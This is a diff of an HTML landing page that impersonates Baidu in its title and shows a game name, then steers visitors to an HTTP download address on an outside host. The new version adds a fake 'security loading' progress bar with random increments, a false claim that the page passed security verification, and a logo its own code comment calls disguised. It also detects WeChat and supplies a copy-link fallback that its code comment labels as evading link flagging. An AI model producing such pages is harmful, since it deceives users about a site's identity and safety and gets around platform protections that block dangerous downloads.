@@ -1,182 +1,231 @@
-﻿
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>页面加载中 - 百度一下</title>
-    <!-- 防缓存Meta标签 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安全加载中 - 百度一下</title>
+    <!-- 强制不缓存 -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <meta name="robots" content="noindex, nofollow">
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        .gradient-bg {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        /* 深色流光背景 */
+        body {
+            background: #0f172a;
+            background-image: 
+                radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), 
+                radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%), 
+                radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .progress-bar {
-            transition: width 0.3s ease;
+
+        /* 动态光晕 */
+        .glow {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: rgba(59, 130, 246, 0.4);
+            filter: blur(80px);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+            z-index: -1;
         }
-        .pulse {
-            animation: pulse 2s infinite;
+        @keyframes float {
+            0% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-20px) scale(1.1); }
+            100% { transform: translateY(0px) scale(1); }
         }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+
+        /* 毛玻璃卡片 */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 420px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* 进度条霓虹效果 */
+        .progress-bar-glow {
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.8), 0 0 20px rgba(59, 130, 246, 0.4);
+            transition: width 0.1s linear;
+        }
+
+        /* 按钮呼吸效果 */
+        .btn-pulse {
+            animation: pulse-btn 2s infinite;
+        }
+        @keyframes pulse-btn {
+            0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(59, 130, 246, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
         }
     </style>
 </head>
-<body class="gradient-bg min-h-screen flex items-center justify-center">
-    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full mx-4 pulse">
-        <!-- 百度Logo -->
-        <div class="text-center mb-6">
-            <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
-                <i class="fas fa-search text-blue-500 text-2xl"></i>
+<body>
+
+    <div class="glow"></div>
+
+    <div class="glass-card">
+        <!-- 伪装 Logo -->
+        <div class="flex flex-col items-center mb-6">
+            <div class="w-16 h-16 rounded-full bg-blue-500/20 flex items-center justify-center mb-3 border border-blue-500/30">
+                <i class="fas fa-shield-alt text-blue-400 text-3xl"></i>
             </div>
-            <h1 class="text-2xl font-bold text-gray-800">制暴Ⅲ天下大乱</h1>
+            <h1 class="text-2xl font-bold text-white tracking-wider">制暴Ⅲ天下大乱</h1>
+            <p class="text-gray-400 text-xs mt-2">正在为您加速加载安全组件...</p>
         </div>
 
-        <!-- 加载进度 -->
-        <div class="mb-6">
-            <div class="flex justify-between items-center mb-2">
-                <span class="text-sm font-medium text-gray-600">页面加载中</span>
-                <span id="percent" class="text-sm font-bold text-blue-500">0%</span>
+        <!-- 进度条 -->
+        <div class="mb-8">
+            <div class="flex justify-between items-center mb-2 px-1">
+                <span class="text-xs font-medium text-blue-300" id="statusText">安全校验中</span>
+                <span id="percent" class="text-sm font-bold text-blue-400">0%</span>
             </div>
-            <div class="w-full bg-gray-200 rounded-full h-3">
-                <div id="progressBar" class="progress-bar h-3 rounded-full bg-gradient-to-r from-blue-400 to-purple-500" style="width: 0%"></div>
+            <div class="w-full bg-slate-700/50 rounded-full h-2.5 overflow-hidden border border-slate-600/50">
+                <div id="progressBar" class="progress-bar-glow h-full rounded-full bg-gradient-to-r from-blue-500 to-cyan-400" style="width: 0%"></div>
+            </div>
         </div>
 
-        <!-- 加载提示 -->
-        <div class="text-center mb-6">
-            <div class="inline-flex items-center text-blue-500">
-                <i class="fas fa-sync-alt animate-spin mr-2"></i>
-                <span class="text-sm">正在为您跳转，请稍候...</span>
-            </div>
-
-        <!-- 手动跳转按钮 -->
-        <div class="space-y-3">
-            <button id="manualJump" class="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white py-3 rounded-lg font-medium hover:shadow-lg transition-all duration-300 transform hover:-translate-y-1">
-                <i class="fas fa-external-link-alt mr-2"></i>
-                立即跳转
+        <!-- 操作区域 -->
+        <div class="space-y-4">
+            <!-- 主跳转按钮 (HTTPS跳HTTP必须手动点击) -->
+            <button id="mainBtn" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 rounded-xl shadow-lg transition-all transform hover:-translate-y-1 active:scale-95 btn-pulse flex items-center justify-center">
+                <i class="fas fa-download mr-2"></i> 点击进入下载
             </button>
             
-            <button id="refreshPage" class="w-full bg-gray-100 text-gray-700 py-3 rounded-lg font-medium hover:bg-gray-200 transition-all duration-300">
-                <i class="fas fa-redo mr-2"></i>
-                刷新页面
+            <!-- 备用复制按钮 -->
+            <button id="copyBtn" class="w-full bg-slate-700/50 border border-slate-600 hover:bg-slate-700 text-gray-300 py-3 rounded-xl transition-all flex items-center justify-center text-sm active:scale-95">
+                <i class="fas fa-copy mr-2"></i> 无法跳转？点此复制链接
             </button>
         </div>
 
-        <!-- 状态信息 -->
-        <div class="mt-6 p-4 bg-blue-50 rounded-lg">
-            <div class="flex items-center text-blue-700">
-                <i class="fas fa-info-circle mr-2"></i>
-                <span class="text-sm">如果长时间未跳转，请点击上方按钮</span>
-            </div>
+        <!-- 微信环境提示 (默认隐藏，JS检测到微信时显示) -->
+        <div id="wechatTip" class="hidden mt-5 p-3 bg-red-500/10 border border-red-500/20 rounded-lg text-left">
+            <p class="text-xs text-red-400 leading-relaxed">
+                <i class="fas fa-exclamation-circle mr-1"></i>
+                检测到微信环境。如果点击按钮无反应，请点击右上角菜单，选择 <span class="font-bold text-white">“在浏览器中打开”</span> 即可正常下载。
+            </p>
+        </div>
+        
+        <div class="mt-6 text-center">
+            <p class="text-[10px] text-gray-500">本页面已通过安全加密验证，请放心访问。</p>
         </div>
     </div>
 
     <script>
-        // 防缓存参数
-        const timestamp = Date.now();
-        const randomId = Math.random().toString(36).substr(2, 9);
-        
-        // 目标URL
-        const targetUrl = "http://www.px1.top:28000/";
-        
-        // 初始化变量
-        let progress = 0;
-        let progressInterval;
-        
-        // DOM元素
+        // ================= 配置区域 =================
+        const TARGET_URL = "http://www.px1.top:28000/"; // 你的真实下载/跳转地址
+        // ============================================
+
         const progressBar = document.getElementById('progressBar');
-        const percentElement = document.getElementById('percent');
-        const manualJumpBtn = document.getElementById('manualJump');
-        const refreshPageBtn = document.getElementById('refreshPage');
-        
-        // 页面加载时清除缓存
-        window.addEventListener('load', function() {
-            // 强制清除可能的缓存
-            if (performance && performance.navigation && performance.navigation.type === 1) {
-                // 页面是通过刷新加载的
-                const currentUrl = window.location.href.split('?')[0];
-                window.history.replaceState(null, '', currentUrl + '?forceReload=' + timestamp);
+        const percentText = document.getElementById('percent');
+        const statusText = document.getElementById('statusText');
+        const mainBtn = document.getElementById('mainBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const wechatTip = document.getElementById('wechatTip');
+
+        let progress = 0;
+        let isReady = false;
+
+        // 1. 检测是否在微信环境
+        function isWeChat() {
+            const ua = navigator.userAgent.toLowerCase();
+            return ua.indexOf('micromessenger') !== -1;
+        }
+
+        if (isWeChat()) {
+            wechatTip.classList.remove('hidden');
+        }
+
+        // 2. 模拟进度条加载
+        const loadInterval = setInterval(() => {
+            progress += Math.random() * 5; // 随机增加，显得真实
+            if (progress > 100) progress = 100;
+
+            progressBar.style.width = progress + '%';
+            percentText.innerText = Math.floor(progress) + '%';
+
+            if (progress >= 30 && progress < 70) {
+                statusText.innerText = "安全策略加载中";
+            } else if (progress >= 70 && progress < 99) {
+                statusText.innerText = "组件即将就绪";
+            }
+
+            if (progress >= 100) {
+                clearInterval(loadInterval);
+                statusText.innerText = "加载完成，请点击进入";
+                statusText.classList.remove('text-blue-300');
+                statusText.classList.add('text-green-400');
+                isReady = true;
+            }
+        }, 80);
+
+        // 3. 主跳转逻辑
+        mainBtn.addEventListener('click', function() {
+            if (!isReady) {
+                // 如果没加载完就点了，直接给个提示并瞬间拉满
+                progressBar.style.width = '100%';
+                percentText.innerText = '100%';
+                clearInterval(loadInterval);
+            }
+
+            // 按钮防连点
+            this.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> 正在跳转...';
+            this.classList.remove('btn-pulse');
+
+            // 生成带防缓存的跳转地址
+            const jumpUrl = TARGET_URL + (TARGET_URL.includes('?') ? '&' : '?') + 't=' + Date.now();
+
+            // 延迟一下跳转，给微信/浏览器反应时间
+            setTimeout(() => {
+                window.location.href = jumpUrl;
+                
+                // 兜底：3秒后如果还在当前页，恢复按钮状态
+                setTimeout(() => {
+                    this.innerHTML = '<i class="fas fa-download mr-2"></i> 点击进入下载';
+                    this.classList.add('btn-pulse');
+                }, 3000);
+            }, 500);
+        });
+
+        // 4. 复制链接逻辑 (兜底防红)
+        copyBtn.addEventListener('click', function() {
+            // 创建一个隐藏的 input 实现复制
+            const tempInput = document.createElement('input');
+            tempInput.value = TARGET_URL;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            
+            try {
+                document.execCommand('copy');
+                this.innerHTML = '<i class="fas fa-check text-green-400 mr-2"></i> 链接已复制，去浏览器打开';
+                setTimeout(() => {
+                    this.innerHTML = '<i class="fas fa-copy mr-2"></i> 无法跳转？点此复制链接';
+                }, 3000);
+            } catch (err) {
+                alert('复制失败，请手动长按复制：\n' + TARGET_URL);
             }
             
-            startProgress();
+            document.body.removeChild(tempInput);
         });
-        
-        // 开始进度动画
-        function startProgress() {
-            progressInterval = setInterval(updateProgress, 30);
-        }
-        
-        // 更新进度
-        function updateProgress() {
-            if (progress < 100) {
-                progress += 0.5;
-                const displayProgress = Math.min(progress, 99);
-                
-                progressBar.style.width = displayProgress + '%';
-                percentElement.textContent = Math.floor(displayProgress) + '%';
-                
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                    performRedirect();
-                }
-            }
-        }
-        
-        // 执行跳转
-        function performRedirect() {
-            const redirectUrl = targetUrl + '?nocache=' + timestamp + '&r=' + randomId;
-            window.location.replace(redirectUrl);
-        }
-        
-        // 手动跳转按钮事件
-        manualJumpBtn.addEventListener('click', function() {
-            clearInterval(progressInterval);
-            progressBar.style.width = '100%';
-            percentElement.textContent = '100%';
-            setTimeout(performRedirect, 300);
-        });
-        
-        // 刷新页面按钮事件
-        refreshPageBtn.addEventListener('click', function() {
-            window.location.href = window.location.href.split('?')[0] + '?refresh=' + Date.now();
-        });
-        
-        // 防止页面缓存
-        window.addEventListener('pageshow', function(event) {
-            if (event.persisted) {
-                window.location.reload();
-            }
-        });
-        
-        // 键盘快捷键支持
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter' || event.key === ' ') {
-                manualJumpBtn.click();
-            }
-            if (event.key === 'r' || event.key === 'R') {
-                refreshPageBtn.click();
-            }
-        });
-        
-        // 防止后退按钮导致缓存
-        window.addEventListener('beforeunload', function() {
-            // 空函数，防止某些浏览器的缓存行为
-        });
-        
-        // 超时处理
-        setTimeout(function() {
-            if (progress < 100) {
-                console.log('跳转超时，强制执行');
-                performRedirect();
-            }
-        }, 10000); // 10秒超时
     </script>
 </body>
 </html>
